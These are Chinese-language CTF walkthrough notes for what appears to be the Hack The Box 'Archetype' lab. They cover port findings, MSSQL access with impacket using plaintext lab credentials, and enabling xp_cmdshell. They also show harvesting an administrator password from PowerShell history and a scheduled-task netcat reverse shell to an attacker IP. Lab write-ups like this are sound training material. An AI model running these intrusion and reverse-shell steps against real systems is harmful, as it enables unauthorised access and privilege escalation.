-----------------结论----------------------------
SMB 服务 (端口 139, 445):
	服务器版本与主机操作系统一致。
	关键发现: 允许匿名/访客(guest)访问，且消息签名未被强制启用 (Message signing enabled but not required)。这是一个常见的弱点，允许无需凭证即可枚举共享资源。
MSSQL 服务 (端口 1433):
	版本: Microsoft SQL Server 2017 RTM (14.00.1000.00)。
	关键发现:
		服务暴露在网络上，是首要的攻击目标。
		ms-sql-ntlm-info 脚本成功获取了主机的域信息，表明该服务使用了Windows身份验证（集成认证）。
WinRM 服务 (端口 5985):
		运行着 Microsoft HTTPAPI。如果获取到有效的本地管理员凭据，可通过此服务进行远程命令行访问。
MSRPC 服务 (端口 135):
		Windows RPC端口，常与其他服务联动用于信息枚举或利用。

使用imparket访问sqlserver数据库 

sudo impacket-mssqlclient 'ARCHETYPE/sql_svc':M3g4c0rp123@10.129.95.187 -windows-auth

启用xp_cmdshell函数并反弹shell 

EXEC sp_configure 'show advanced options', 1; //将高级选项设置为 1（启用）
RECONFIGURE;  //使配置生效
EXEC sp_configure 'xp_cmdshell', 1;  //将 xp_cmdshell选项设置为 1（启用）
RECONFIGURE;  //使配置生效

获取敏感信息 

type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 
	net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n! //发现账户密码
	
//ConsoleHost_history.txt 是 PowerShell 的命令历史记录文件，类似于 Linux 中的 ~/.bash_history。记录内容：记录了 sql_svc用户在 PowerShell 中执行过的所有命令。自动保存：每当用户在 PowerShell 中执行命令，该命令会自动追加到此文件。位置：存储在用户的 AppData 目录中，是用户特定的。

选择1：利用使用计划任务反弹shell 


schtasks /create /tn "test1" /tr "C:\Windows\Temp\nc.exe 10.10.16.X 5555 -e cmd.exe" /sc minute /mo 1 /ru administrator /rp MEGACORP_4dm1n!! 
// 会创建一个名为 test1的计划任务。这个任务会以系统管理员（administrator）的最高权限，在后台每分钟自动执行一次以下操作.


---------------------
sudo nc -lvvp 5555 //做好监听
